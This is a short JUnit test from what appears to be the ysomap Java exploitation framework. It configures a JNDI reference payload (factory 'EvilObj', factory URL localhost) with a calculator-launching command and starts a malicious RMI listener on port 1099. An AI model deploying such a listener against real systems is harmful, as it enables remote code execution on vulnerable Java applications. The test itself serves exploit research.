package ysomap.core.exploit.rmi;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.gadget.payload.rmi.RefWrapper;

import static org.junit.Assert.*;

/**
 * @author wh1t3P1g
 * @since 2020/3/10
 */
public class RMIRefListenerTest {

    @Test
    public void work() throws Exception {
        Payload payload = new RefWrapper();
        Bullet bullet = (Bullet) payload.getDefaultBullet("open /System/Applications/Calculator.app");
        bullet.set("factoryName","EvilObj");
        bullet.set("factoryURL","http://localhost");
        payload.setBullet(bullet);
        Object obj = payload.getObject();
        RMIRefListener listener = new RMIRefListener();
        listener.set("payload", obj);
        listener.set("objectName","tst");
        listener.set("lport","1099");
        listener.run();
    }
}